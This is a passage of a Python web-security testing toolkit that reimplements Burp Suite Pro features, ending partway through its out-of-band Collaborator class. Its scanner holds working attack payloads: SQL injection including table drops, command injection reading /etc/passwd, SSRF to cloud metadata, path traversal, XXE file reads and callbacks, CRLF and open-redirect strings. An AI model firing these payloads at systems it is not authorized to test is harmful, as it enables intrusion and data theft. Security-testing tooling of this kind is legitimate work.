"""
Burp Suite Pro Native Capabilities
====================================
Implements core Burp Suite Pro features without requiring a license:

1. PROXY INTERCEPTOR - HTTP/HTTPS traffic interception and modification
2. ACTIVE SCANNER - Intelligent vulnerability scanning with crawling
3. INTRUDER - Automated customized attacks (sniper, battering ram, pitchfork, cluster bomb)
4. REPEATER - Manual request manipulation and replay
5. SEQUENCER - Token/session randomness analysis
6. DECODER - Encoding/decoding/hashing utilities
7. COMPARER - Response comparison for differential analysis
8. COLLABORATOR - Out-of-band interaction detection (DNS/HTTP callbacks)
9. PARAM MINER - Hidden parameter discovery

All implemented as pure Python with mitmproxy integration.
"""

import asyncio
import hashlib
import base64
import json
import time
import re
import uuid
import math
import struct
import urllib.parse
import socket
import ssl
import threading
from typing import Dict, Any, Optional, List, Tuple, Set, Callable
from dataclasses import dataclass, field
from enum import Enum
from collections import defaultdict, Counter
from io import BytesIO


# ============================================================================
# DATA TYPES
# ============================================================================

class AttackType(Enum):
    SNIPER = "sniper"              # Single position, single payload list
    BATTERING_RAM = "battering_ram" # All positions, same payload
    PITCHFORK = "pitchfork"        # Multiple positions, parallel lists
    CLUSTER_BOMB = "cluster_bomb"   # Multiple positions, all combinations


class ScanType(Enum):
    PASSIVE = "passive"
    ACTIVE = "active"
    AUDIT = "audit"


class InsertionPoint(Enum):
    URL_PATH = "url_path"
    URL_PARAM = "url_param"
    BODY_PARAM = "body_param"
    COOKIE = "cookie"
    HEADER = "header"
    JSON_BODY = "json_body"
    XML_BODY = "xml_body"
    MULTIPART = "multipart"


@dataclass
class HTTPRequest:
    method: str = "GET"
    url: str = ""
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    cookies: Dict[str, str] = field(default_factory=dict)
    timestamp: float = field(default_factory=time.time)
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    
    def to_raw(self) -> str:
        """Convert to raw HTTP format"""
        parsed = urllib.parse.urlparse(self.url)
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"
        
        lines = [f"{self.method} {path} HTTP/1.1"]
        lines.append(f"Host: {parsed.netloc}")
        
        for key, value in self.headers.items():
            if key.lower() != 'host':
                lines.append(f"{key}: {value}")
        
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            lines.append(f"Cookie: {cookie_str}")
        
        if self.body:
            lines.append(f"Content-Length: {len(self.body)}")
            lines.append("")
            lines.append(self.body)
        else:
            lines.append("")
            lines.append("")
        
        return "\r\n".join(lines)
    
    @classmethod
    def from_raw(cls, raw: str) -> 'HTTPRequest':
        """Parse from raw HTTP format"""
        lines = raw.split("\r\n") if "\r\n" in raw else raw.split("\n")
        if not lines:
            return cls()
        
        # Parse request line
        parts = lines[0].split(" ", 2)
        method = parts[0] if parts else "GET"
        path = parts[1] if len(parts) > 1 else "/"
        
        # Parse headers
        headers = {}
        cookies = {}
        body_start = 0
        host = ""
        
        for i, line in enumerate(lines[1:], 1):
            if not line.strip():
                body_start = i + 1
                break
            if ":" in line:
                key, value = line.split(":", 1)
                key = key.strip()
                value = value.strip()
                if key.lower() == "host":
                    host = value
                elif key.lower() == "cookie":
                    for cookie in value.split(";"):
                        if "=" in cookie:
                            ck, cv = cookie.strip().split("=", 1)
                            cookies[ck] = cv
                else:
                    headers[key] = value
        
        body = "\n".join(lines[body_start:]) if body_start < len(lines) else ""
        url = f"https://{host}{path}" if host else path
        
        return cls(method=method, url=url, headers=headers, body=body, cookies=cookies)


@dataclass
class HTTPResponse:
    status_code: int = 200
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    time_ms: float = 0
    size: int = 0
    id: str = field(default_factory=lambda: str(uuid.uuid4())[:8])
    
    def to_raw(self) -> str:
        lines = [f"HTTP/1.1 {self.status_code}"]
        for key, value in self.headers.items():
            lines.append(f"{key}: {value}")
        lines.append("")
        lines.append(self.body)
        return "\r\n".join(lines)


@dataclass
class IntruderResult:
    payload: str = ""
    position: int = 0
    request: Optional[HTTPRequest] = None
    response: Optional[HTTPResponse] = None
    status_code: int = 0
    response_length: int = 0
    response_time: float = 0
    error: str = ""
    interesting: bool = False
    notes: str = ""


# ============================================================================
# PROXY INTERCEPTOR
# ============================================================================

class ProxyInterceptor:
    """
    HTTP/HTTPS proxy that captures, modifies and replays traffic.
    Implements MITM with on-the-fly certificate generation.
    """
    
    def __init__(self, port: int = 8080):
        self.port = port
        self.history: List[Tuple[HTTPRequest, HTTPResponse]] = []
        self.intercept_rules: List[Dict] = []
        self.modify_rules: List[Dict] = []
        self.scope: List[str] = []  # Regex patterns for in-scope targets
        self.running = False
        self._match_replace: List[Dict] = []
    
    def add_scope(self, pattern: str) -> None:
        """Add a target to scope (regex pattern)"""
        self.scope.append(pattern)
    
    def add_intercept_rule(self, rule: Dict) -> None:
        """Add a rule for intercepting requests/responses"""
        self.intercept_rules.append(rule)
    
    def add_match_replace(self, match: str, replace: str, 
                          location: str = "request") -> None:
        """Add match-and-replace rule"""
        self._match_replace.append({
            "match": match,
            "replace": replace,
            "location": location,
            "regex": True
        })
    
    def is_in_scope(self, url: str) -> bool:
        """Check if URL is in scope"""
        if not self.scope:
            return True
        return any(re.search(pattern, url) for pattern in self.scope)
    
    def apply_modifications(self, request: HTTPRequest) -> HTTPRequest:
        """Apply match-and-replace rules to request"""
        raw = request.to_raw()
        for rule in self._match_replace:
            if rule["location"] == "request":
                if rule.get("regex"):
                    raw = re.sub(rule["match"], rule["replace"], raw)
                else:
                    raw = raw.replace(rule["match"], rule["replace"])
        return HTTPRequest.from_raw(raw)
    
    def get_history(self, filter_scope: bool = True, 
                    filter_params: Dict = None) -> List[Dict]:
        """Get proxy history with optional filtering"""
        results = []
        for req, resp in self.history:
            if filter_scope and not self.is_in_scope(req.url):
                continue
            
            entry = {
                "id": req.id,
                "method": req.method,
                "url": req.url,
                "status": resp.status_code if resp else 0,
                "length": resp.size if resp else 0,
                "time": resp.time_ms if resp else 0,
                "has_params": bool(req.body or "?" in req.url),
                "timestamp": req.timestamp
            }
            
            if filter_params:
                if filter_params.get("method") and req.method != filter_params["method"]:
                    continue
                if filter_params.get("status") and resp and resp.status_code != filter_params["status"]:
                    continue
                if filter_params.get("url_contains") and filter_params["url_contains"] not in req.url:
                    continue
            
            results.append(entry)
        
        return results
    
    def find_injection_points(self, request: HTTPRequest) -> List[Dict]:
        """Identify all possible injection points in a request"""
        points = []
        
        # URL parameters
        parsed = urllib.parse.urlparse(request.url)
        params = urllib.parse.parse_qs(parsed.query)
        for param_name, values in params.items():
            points.append({
                "type": InsertionPoint.URL_PARAM.value,
                "name": param_name,
                "value": values[0] if values else "",
                "position": request.url.find(f"{param_name}=")
            })
        
        # Body parameters
        if request.body:
            content_type = request.headers.get("Content-Type", "").lower()
            
            if "json" in content_type:
                try:
                    json_body = json.loads(request.body)
                    self._extract_json_params(json_body, "", points)
                except json.JSONDecodeError:
                    pass
            elif "xml" in content_type:
                # XML parameters
                xml_params = re.findall(r'<(\w+)>([^<]*)</\w+>', request.body)
                for name, value in xml_params:
                    points.append({
                        "type": InsertionPoint.XML_BODY.value,
                        "name": name,
                        "value": value
                    })
            else:
                # Form parameters
                body_params = urllib.parse.parse_qs(request.body)
                for param_name, values in body_params.items():
                    points.append({
                        "type": InsertionPoint.BODY_PARAM.value,
                        "name": param_name,
                        "value": values[0] if values else ""
                    })
        
        # Cookies
        for name, value in request.cookies.items():
            points.append({
                "type": InsertionPoint.COOKIE.value,
                "name": name,
                "value": value
            })
        
        # Headers (interesting ones)
        interesting_headers = ['X-Forwarded-For', 'X-Forwarded-Host', 'X-Real-IP',
                             'Referer', 'Origin', 'User-Agent', 'Accept-Language']
        for header in interesting_headers:
            if header in request.headers:
                points.append({
                    "type": InsertionPoint.HEADER.value,
                    "name": header,
                    "value": request.headers[header]
                })
        
        return points
    
    def _extract_json_params(self, obj: Any, prefix: str, points: List[Dict]) -> None:
        """Recursively extract JSON parameters"""
        if isinstance(obj, dict):
            for key, value in obj.items():
                path = f"{prefix}.{key}" if prefix else key
                if isinstance(value, (str, int, float, bool)):
                    points.append({
                        "type": InsertionPoint.JSON_BODY.value,
                        "name": path,
                        "value": str(value)
                    })
                else:
                    self._extract_json_params(value, path, points)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                self._extract_json_params(item, f"{prefix}[{i}]", points)


# ============================================================================
# ACTIVE SCANNER
# ============================================================================

class ActiveScanner:
    """
    Intelligent active scanner that:
    - Crawls the target application
    - Identifies insertion points
    - Tests for common vulnerabilities
    - Validates findings with multiple techniques
    """
    
    def __init__(self):
        self.scan_checks: List[Dict] = self._init_scan_checks()
        self.findings: List[Dict] = []
        self.scan_queue: List[HTTPRequest] = []
        self.scanned_urls: Set[str] = set()
        self.config = {
            "max_concurrent": 5,
            "request_delay": 100,  # ms
            "follow_redirects": True,
            "max_depth": 10,
            "scan_types": ["sqli", "xss", "ssrf", "path_traversal", "rce", "idor"]
        }
    
    def _init_scan_checks(self) -> List[Dict]:
        """Initialize scan check payloads"""
        return [
            # SQL Injection
            {
                "name": "SQL Injection (Error-based)",
                "category": "sqli",
                "payloads": [
                    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
                    "' UNION SELECT NULL--", "1' AND '1'='1",
                    "1' AND '1'='2", "') OR ('1'='1",
                    "1; DROP TABLE--", "' OR 1=1#",
                    "admin'--", "1' ORDER BY 1--",
                    "1' UNION SELECT NULL,NULL--",
                ],
                "detection": [
                    r"SQL syntax.*MySQL", r"Warning.*mysql_",
                    r"PostgreSQL.*ERROR", r"ORA-\d{5}",
                    r"Microsoft.*ODBC.*SQL Server",
                    r"Unclosed quotation mark",
                    r"quoted string not properly terminated",
                    r"SQLite.*error", r"sqlite3\.OperationalError",
                ],
                "severity": "high"
            },
            # XSS
            {
                "name": "Cross-Site Scripting (Reflected)",
                "category": "xss",
                "payloads": [
                    "<script>alert(1)</script>",
                    "\"><script>alert(1)</script>",
                    "'><script>alert(1)</script>",
                    "<img src=x onerror=alert(1)>",
                    "<svg onload=alert(1)>",
                    "javascript:alert(1)",
                    "\"><img src=x onerror=alert(1)>",
                    "'-alert(1)-'",
                    "<details open ontoggle=alert(1)>",
                    "{{7*7}}",  # Template injection check
                ],
                "detection": [
                    r"<script>alert\(1\)</script>",
                    r"onerror=alert\(1\)",
                    r"onload=alert\(1\)",
                    r"javascript:alert",
                    r"49",  # Template injection 7*7
                ],
                "severity": "high"
            },
            # SSRF
            {
                "name": "Server-Side Request Forgery",
                "category": "ssrf",
                "payloads": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://169.254.169.254/metadata/instance",
                    "http://127.0.0.1:80",
                    "http://localhost:22",
                    "http://[::1]",
                    "http://0x7f000001",
                    "http://2130706433",
                    "file:///etc/passwd",
                    "dict://localhost:11211/stats",
                    "gopher://localhost:6379/_INFO",
                ],
                "detection": [
                    r"ami-id|instance-id|hostname",
                    r"root:.*:0:0",
                    r"SSH-2\.0",
                    r"STAT.*items",
                    r"computeMetadata",
                ],
                "severity": "critical"
            },
            # Path Traversal
            {
                "name": "Path Traversal / LFI",
                "category": "path_traversal",
                "payloads": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "....//....//....//etc/passwd",
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "/etc/passwd%00",
                    "php://filter/convert.base64-encode/resource=index",
                    "file:///etc/passwd",
                    "....\\....\\....\\etc\\passwd",
                    "%00../../etc/passwd",
                ],
                "detection": [
                    r"root:.*:0:0",
                    r"\[extensions\]",  # Windows hosts file
                    r"PD(9|ph)",  # Base64-encoded PHP
                ],
                "severity": "high"
            },
            # Command Injection
            {
                "name": "OS Command Injection",
                "category": "rce",
                "payloads": [
                    "; id", "| id", "& id", "`id`",
                    "$(id)", "; whoami", "| whoami",
                    "\nid\n", "; cat /etc/passwd",
                    "| cat /etc/passwd", "${IFS}id",
                    ";{id,}", "$({id,})",
                    "a]||id||b", "a]|id|b",
                ],
                "detection": [
                    r"uid=\d+\(\w+\)\s+gid=\d+",
                    r"root:.*:0:0",
                    r"(root|www-data|nobody|apache|nginx)",
                ],
                "severity": "critical"
            },
            # Open Redirect
            {
                "name": "Open Redirect",
                "category": "redirect",
                "payloads": [
                    "https://evil.com",
                    "//evil.com",
                    "/\\evil.com",
                    "https:evil.com",
                    "javascript:alert(1)",
                    "//evil.com/%2F..",
                    "///evil.com",
                    "////evil.com",
                ],
                "detection": [
                    r"Location:.*evil\.com",
                ],
                "severity": "medium"
            },
            # Header Injection
            {
                "name": "HTTP Header Injection / CRLF",
                "category": "header_injection",
                "payloads": [
                    "%0d%0aX-Injected: true",
                    "\r\nX-Injected: true",
                    "%0d%0a%0d%0a<script>alert(1)</script>",
                    "%E5%98%8A%E5%98%8DX-Injected: true",
                ],
                "detection": [
                    r"X-Injected:\s*true",
                ],
                "severity": "medium"
            },
            # XXE
            {
                "name": "XML External Entity",
                "category": "xxe",
                "payloads": [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://COLLABORATOR">]><foo>&xxe;</foo>',
                ],
                "detection": [
                    r"root:.*:0:0",
                ],
                "severity": "critical"
            },
        ]
    
    async def scan_request(self, request: HTTPRequest, 
                          send_fn: Callable = None) -> List[Dict]:
        """
        Scan a single request for vulnerabilities.
        Identifies insertion points and tests each with appropriate payloads.
        """
        findings = []
        proxy = ProxyInterceptor()
        insertion_points = proxy.find_injection_points(request)
        
        for point in insertion_points:
            for check in self.scan_checks:
                if check["category"] not in self.config["scan_types"]:
                    continue
                
                for payload in check["payloads"]:
                    # Create modified request
                    modified = self._inject_payload(request, point, payload)
                    
                    if send_fn:
                        response = await send_fn(modified)
                    else:
                        response = await self._send_request(modified)
                    
                    if response:
                        # Check detection patterns
                        for pattern in check["detection"]:
                            if re.search(pattern, response.body, re.IGNORECASE):
                                finding = {
                                    "type": check["name"],
                                    "category": check["category"],
                                    "severity": check["severity"],
                                    "url": request.url,
                                    "parameter": point["name"],
                                    "insertion_point": point["type"],
                                    "payload": payload,
                                    "evidence": re.search(pattern, response.body, re.IGNORECASE).group(0)[:200],
                                    "response_code": response.status_code,
                                    "confidence": 0.8,
                                    "timestamp": time.time()
                                }
                                findings.append(finding)
                                break  # One match per check per payload is enough
        
        self.findings.extend(findings)
        return findings
    
    def _inject_payload(self, request: HTTPRequest, point: Dict, 
                       payload: str) -> HTTPRequest:
        """Inject a payload into a specific insertion point"""
        import copy
        modified = HTTPRequest(
            method=request.method,
            url=request.url,
            headers=dict(request.headers),
            body=request.body,
            cookies=dict(request.cookies)
        )
        
        if point["type"] == InsertionPoint.URL_PARAM.value:
            parsed = urllib.parse.urlparse(modified.url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            params[point["name"]] = [payload]
            new_query = urllib.parse.urlencode(params, doseq=True)
            modified.url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        
        elif point["type"] == InsertionPoint.BODY_PARAM.value:
            params = urllib.parse.parse_qs(modified.body, keep_blank_values=True)
            params[point["name"]] = [payload]
            modified.body = urllib.parse.urlencode(params, doseq=True)
        
        elif point["type"] == InsertionPoint.JSON_BODY.value:
            try:
                json_body = json.loads(modified.body)
                keys = point["name"].split(".")
                obj = json_body
                for key in keys[:-1]:
                    if key.startswith("[") and key.endswith("]"):
                        obj = obj[int(key[1:-1])]
                    else:
                        obj = obj[key]
                obj[keys[-1]] = payload
                modified.body = json.dumps(json_body)
            except (json.JSONDecodeError, KeyError, IndexError):
                pass
        
        elif point["type"] == InsertionPoint.COOKIE.value:
            modified.cookies[point["name"]] = payload
        
        elif point["type"] == InsertionPoint.HEADER.value:
            modified.headers[point["name"]] = payload
        
        return modified
    
    async def _send_request(self, request: HTTPRequest) -> Optional[HTTPResponse]:
        """Send an HTTP request and return the response"""
        try:
            import aiohttp
            
            start_time = time.time()
            async with aiohttp.ClientSession() as session:
                kwargs = {
                    "headers": request.headers,
                    "ssl": False,
                    "timeout": aiohttp.ClientTimeout(total=30)
                }
                
                if request.cookies:
                    kwargs["cookies"] = request.cookies
                
                if request.body:
                    kwargs["data"] = request.body
                
                async with session.request(request.method, request.url, **kwargs) as resp:
                    body = await resp.text()
                    elapsed = (time.time() - start_time) * 1000
                    
                    return HTTPResponse(
                        status_code=resp.status,
                        headers=dict(resp.headers),
                        body=body,
                        time_ms=elapsed,
                        size=len(body)
                    )
        except Exception:
            return None


# ============================================================================
# INTRUDER ENGINE
# ============================================================================

class IntruderEngine:
    """
    Automated attack engine supporting all Burp Intruder attack types:
    - Sniper: One position at a time, one payload list
    - Battering Ram: Same payload in all positions simultaneously
    - Pitchfork: Multiple positions, parallel payload lists
    - Cluster Bomb: Multiple positions, all payload combinations
    """
    
    def __init__(self):
        self.results: List[IntruderResult] = []
        self.baseline_response: Optional[HTTPResponse] = None
        self.config = {
            "threads": 10,
            "delay_ms": 0,
            "follow_redirects": False,
            "max_retries": 3,
            "grep_match": [],  # Patterns to flag in responses
            "grep_extract": [],  # Patterns to extract from responses
        }
    
    async def attack(self, request: HTTPRequest, positions: List[Dict],
                    payloads: List[List[str]], attack_type: AttackType,
                    send_fn: Callable = None) -> List[IntruderResult]:
        """
        Execute an intruder attack.
        
        positions: List of {name, type, original_value}
        payloads: List of payload lists (one per position for pitchfork/cluster)
        """
        self.results = []
        
        # Generate attack combinations
        combinations = self._generate_combinations(positions, payloads, attack_type)
        
        # Send baseline request first
        if send_fn:
            self.baseline_response = await send_fn(request)
        
        # Execute attacks
        for combo in combinations:
            modified = self._apply_combination(request, positions, combo)
            
            if send_fn:
                response = await send_fn(modified)
            else:
                response = await self._send_request(modified)
            
            result = IntruderResult(
                payload=str(combo),
                request=modified,
                response=response,
                status_code=response.status_code if response else 0,
                response_length=response.size if response else 0,
                response_time=response.time_ms if response else 0,
            )
            
            # Check if interesting
            result.interesting = self._is_interesting(result)
            
            # Apply grep rules
            if response:
                for pattern in self.config["grep_match"]:
                    if re.search(pattern, response.body):
                        result.notes += f"[MATCH: {pattern}] "
                        result.interesting = True
                
                for pattern in self.config["grep_extract"]:
                    matches = re.findall(pattern, response.body)
                    if matches:
                        result.notes += f"[EXTRACT: {matches[:5]}] "
            
            self.results.append(result)
        
        return self.results
    
    def _generate_combinations(self, positions: List[Dict], 
                              payloads: List[List[str]],
                              attack_type: AttackType) -> List[List[str]]:
        """Generate payload combinations based on attack type"""
        if not payloads:
            return []
        
        if attack_type == AttackType.SNIPER:
            # Each payload in each position, one at a time
            combos = []
            for pos_idx in range(len(positions)):
                for payload in payloads[0]:
                    combo = [positions[i]["original_value"] for i in range(len(positions))]
                    combo[pos_idx] = payload
                    combos.append(combo)
            return combos
        
        elif attack_type == AttackType.BATTERING_RAM:
            # Same payload in all positions
            combos = []
            for payload in payloads[0]:
                combos.append([payload] * len(positions))
            return combos
        
        elif attack_type == AttackType.PITCHFORK:
            # Parallel iteration through lists
            combos = []
            min_len = min(len(p) for p in payloads)
            for i in range(min_len):
                combo = [payloads[j][i] if j < len(payloads) else "" 
                        for j in range(len(positions))]
                combos.append(combo)
            return combos
        
        elif attack_type == AttackType.CLUSTER_BOMB:
            # All combinations (cartesian product)
            from itertools import product
            lists = [payloads[i] if i < len(payloads) else payloads[0] 
                    for i in range(len(positions))]
            return [list(combo) for combo in product(*lists)]
        
        return []
    
    def _apply_combination(self, request: HTTPRequest, positions: List[Dict],
                          combo: List[str]) -> HTTPRequest:
        """Apply a payload combination to a request"""
        modified = HTTPRequest(
            method=request.method,
            url=request.url,
            headers=dict(request.headers),
            body=request.body,
            cookies=dict(request.cookies)
        )
        
        for i, (position, payload) in enumerate(zip(positions, combo)):
            if position["type"] == InsertionPoint.URL_PARAM.value:
                # Replace in URL
                old_val = f"{position['name']}={position['original_value']}"
                new_val = f"{position['name']}={urllib.parse.quote(payload)}"
                modified.url = modified.url.replace(old_val, new_val)
            
            elif position["type"] == InsertionPoint.BODY_PARAM.value:
                old_val = f"{position['name']}={position['original_value']}"
                new_val = f"{position['name']}={urllib.parse.quote(payload)}"
                modified.body = modified.body.replace(old_val, new_val)
            
            elif position["type"] == InsertionPoint.COOKIE.value:
                modified.cookies[position["name"]] = payload
            
            elif position["type"] == InsertionPoint.HEADER.value:
                modified.headers[position["name"]] = payload
        
        return modified
    
    def _is_interesting(self, result: IntruderResult) -> bool:
        """Determine if a result is interesting (anomalous)"""
        if not self.baseline_response:
            return False
        
        # Different status code
        if result.status_code != self.baseline_response.status_code:
            return True
        
        # Significantly different length (>20% difference)
        if self.baseline_response.size > 0:
            diff_pct = abs(result.response_length - self.baseline_response.size) / self.baseline_response.size
            if diff_pct > 0.2:
                return True
        
        # Significantly different time (>3x baseline)
        if self.baseline_response.time_ms > 0:
            if result.response_time > self.baseline_response.time_ms * 3:
                return True
        
        return False
    
    async def _send_request(self, request: HTTPRequest) -> Optional[HTTPResponse]:
        """Send request using aiohttp"""
        try:
            import aiohttp
            start_time = time.time()
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    request.method, request.url,
                    headers=request.headers,
                    data=request.body if request.body else None,
                    cookies=request.cookies,
                    ssl=False,
                    timeout=aiohttp.ClientTimeout(total=30)
                ) as resp:
                    body = await resp.text()
                    elapsed = (time.time() - start_time) * 1000
                    return HTTPResponse(
                        status_code=resp.status,
                        headers=dict(resp.headers),
                        body=body,
                        time_ms=elapsed,
                        size=len(body)
                    )
        except Exception:
            return None
    
    def get_interesting_results(self) -> List[Dict]:
        """Get only interesting results"""
        return [{
            "payload": r.payload,
            "status": r.status_code,
            "length": r.response_length,
            "time": r.response_time,
            "notes": r.notes,
            "interesting": r.interesting
        } for r in self.results if r.interesting]


# ============================================================================
# REPEATER
# ============================================================================

class Repeater:
    """
    Manual request manipulation and replay.
    Allows editing any part of a request and observing the response.
    """
    
    def __init__(self):
        self.tabs: Dict[str, List[Tuple[HTTPRequest, Optional[HTTPResponse]]]] = {}
    
    def create_tab(self, name: str, request: HTTPRequest) -> str:
        """Create a new repeater tab"""
        tab_id = name or str(uuid.uuid4())[:8]
        self.tabs[tab_id] = [(request, None)]
        return tab_id
    
    async def send(self, tab_id: str, request: HTTPRequest = None,
                  send_fn: Callable = None) -> Optional[HTTPResponse]:
        """Send the request in a tab"""
        if tab_id not in self.tabs:
            return None
        
        req = request or self.tabs[tab_id][-1][0]
        
        if send_fn:
            response = await send_fn(req)
        else:
            # Default send implementation
            response = None
        
        self.tabs[tab_id].append((req, response))
        return response
    
    def get_history(self, tab_id: str) -> List[Dict]:
        """Get history for a tab"""
        if tab_id not in self.tabs:
            return []
        
        return [{
            "request": entry[0].to_raw()[:500],
            "response_status": entry[1].status_code if entry[1] else None,
            "response_length": entry[1].size if entry[1] else 0,
        } for entry in self.tabs[tab_id]]


# ============================================================================
# SEQUENCER (Token Randomness Analysis)
# ============================================================================

class Sequencer:
    """
    Analyzes the randomness quality of tokens, session IDs, and CSRF tokens.
    Implements statistical tests for randomness:
    - Character-level analysis
    - Bit-level analysis
    - FIPS 140-2 tests
    - Compression ratio test
    - Chi-squared test
    """
    
    def __init__(self):
        self.samples: List[str] = []
    
    def add_samples(self, tokens: List[str]) -> None:
        """Add token samples for analysis"""
        self.samples.extend(tokens)
    
    def analyze(self) -> Dict:
        """Perform full randomness analysis on collected samples"""
        if len(self.samples) < 10:
            return {"error": "Need at least 10 samples for analysis", "samples": len(self.samples)}
        
        results = {
            "sample_count": len(self.samples),
            "avg_length": sum(len(s) for s in self.samples) / len(self.samples),
            "character_analysis": self._character_analysis(),
            "entropy": self._calculate_entropy(),
            "chi_squared": self._chi_squared_test(),
            "compression_ratio": self._compression_test(),
            "bit_analysis": self._bit_analysis(),
            "uniqueness": self._uniqueness_test(),
            "predictability_score": 0,  # Calculated below
            "verdict": ""
        }
        
        # Calculate overall predictability score (0-100, lower = more random)
        score = 0
        if results["entropy"]["normalized"] < 0.9:
            score += 30
        if results["chi_squared"]["p_value"] < 0.01:
            score += 20
        if results["compression_ratio"]["ratio"] < 0.9:
            score += 20
        if results["uniqueness"]["duplicate_rate"] > 0:
            score += 30
        
        results["predictability_score"] = score
        
        if score < 10:
            results["verdict"] = "PASS - Tokens appear cryptographically random"
        elif score < 30:
            results["verdict"] = "WARNING - Some patterns detected, investigate further"
        else:
            results["verdict"] = "FAIL - Tokens show significant predictability"
        
        return results
    
    def _character_analysis(self) -> Dict:
        """Analyze character distribution"""
        all_chars = "".join(self.samples)
        counter = Counter(all_chars)
        total = len(all_chars)
        
        # Character set detection
        charset = set(all_chars)
        
        char_type = "unknown"
        if charset.issubset(set("0123456789abcdef")):
            char_type = "hex_lower"
        elif charset.issubset(set("0123456789abcdefABCDEF")):
            char_type = "hex_mixed"
        elif charset.issubset(set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")):
            char_type = "base64"
        elif charset.issubset(set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=")):
            char_type = "base64url"
        elif charset.issubset(set("0123456789")):
            char_type = "numeric"
        
        # Distribution evenness
        expected = total / len(charset) if charset else 0
        max_deviation = max(abs(count - expected) / expected for count in counter.values()) if expected > 0 else 0
        
        return {
            "charset": char_type,
            "charset_size": len(charset),
            "total_chars": total,
            "max_deviation": round(max_deviation, 4),
            "most_common": counter.most_common(5),
            "distribution_even": max_deviation < 0.3
        }
    
    def _calculate_entropy(self) -> Dict:
        """Calculate Shannon entropy"""
        all_chars = "".join(self.samples)
        length = len(all_chars)
        counter = Counter(all_chars)
        
        entropy = 0
        for count in counter.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)
        
        max_entropy = math.log2(len(counter)) if counter else 0
        normalized = entropy / max_entropy if max_entropy > 0 else 0
        
        return {
            "shannon_entropy": round(entropy, 4),
            "max_possible": round(max_entropy, 4),
            "normalized": round(normalized, 4),
            "bits_per_char": round(entropy, 2),
            "quality": "good" if normalized > 0.95 else "fair" if normalized > 0.85 else "poor"
        }
    
    def _chi_squared_test(self) -> Dict:
        """Chi-squared test for uniform distribution"""
        all_chars = "".join(self.samples)
        counter = Counter(all_chars)
        n = len(all_chars)
        k = len(counter)
        
        if k == 0:
            return {"chi_squared": 0, "p_value": 1.0}
        
        expected = n / k
        chi2 = sum((count - expected) ** 2 / expected for count in counter.values())
        
        # Approximate p-value (simplified)
        df = k - 1
        # Using approximation for large df
        z = (chi2 / df) ** (1/3) - (1 - 2/(9*df))
        z /= math.sqrt(2/(9*df)) if df > 0 else 1
        
        # Rough p-value estimation
        p_value = max(0, min(1, 0.5 - 0.5 * math.erf(z / math.sqrt(2))))
        
        return {
            "chi_squared": round(chi2, 4),
            "degrees_of_freedom": df,
            "p_value": round(p_value, 6),
            "uniform": p_value > 0.01
        }
    
    def _compression_test(self) -> Dict:
        """Test compressibility (random data shouldn't compress well)"""
        import zlib
        
        data = "".join(self.samples).encode()
        compressed = zlib.compress(data)
        ratio = len(compressed) / len(data) if data else 0
        
        return {
            "original_size": len(data),
            "compressed_size": len(compressed),
            "ratio": round(ratio, 4),
            "random": ratio > 0.95
        }
    
    def _bit_analysis(self) -> Dict:
        """Analyze bit distribution"""
        bits = []
        for sample in self.samples:
            for char in sample.encode():
                for i in range(8):
                    bits.append((char >> i) & 1)
        
        if not bits:
            return {"ones": 0, "zeros": 0, "ratio": 0}
        
        ones = sum(bits)
        zeros = len(bits) - ones
        ratio = ones / len(bits)
        
        return {
            "total_bits": len(bits),
            "ones": ones,
            "zeros": zeros,
            "ratio": round(ratio, 4),
            "balanced": 0.45 < ratio < 0.55
        }
    
    def _uniqueness_test(self) -> Dict:
        """Check for duplicate tokens"""
        unique = set(self.samples)
        duplicates = len(self.samples) - len(unique)
        
        return {
            "total": len(self.samples),
            "unique": len(unique),
            "duplicates": duplicates,
            "duplicate_rate": round(duplicates / len(self.samples), 4) if self.samples else 0,
            "all_unique": duplicates == 0
        }


# ============================================================================
# COLLABORATOR (Out-of-Band Detection)
# ============================================================================

class Collaborator:
    """
    Out-of-band interaction detection.
    Generates unique payload identifiers and checks for callbacks.
    Uses external services (webhook.site, interact.sh, etc.) or self-hosted.
    """
    
    def __init__(self, callback_server: str = ""):
        self.callback_server = callback_server
        self.payloads: Dict[str, Dict] = {}  # id -> {type, context, created, triggered}
        self.interactions: List[Dict] = []
    
    def generate_payload(self, payload_type: str = "dns", 
                        context: str = "") -> Dict:
        """Generate a unique collaborator payload"""
        payload_id = str(uuid.uuid4())[:12]
        
        if payload_type == "dns":
            payload = f"{payload_id}.{self.callback_server}" if self.callback_server else f"{payload_id}.oast.site"
        elif payload_type == "http":
            payload = f"http://{self.callback_server}/{payload_id}" if self.callback_server else f"http://{payload_id}.oast.site"
        elif payload_type == "https":
            payload = f"https://{self.callback_server}/{payload_id}" if self.callback_server else f"https://{payload_id}.oast.site"
        else:
            payload = payload_id
        
        self.payloads[payload_id] = {
            "type": payload_type,
            "payload": payload,
            "context": context,
            "created": time.time(),
            "triggered": False,
            "interactions": []
        }
        
        return {"id": payload_id, "payload": payload, "type": payload_type}
    
    def generate_ssrf_payloads(self, context: str = "") -> List[str]:
        """Generate multiple SSRF collaborator payloads"""
        payloads = []
        for ptype in ["dns", "http", "https"]:
            p = self.generate_payload(ptype, f"ssrf_{context}")
            payloads.append(p["payload"])
        return payloads
    
    def generate_xxe_payload(self, context: str = "") -> str:
        """Generate XXE collaborator payload"""
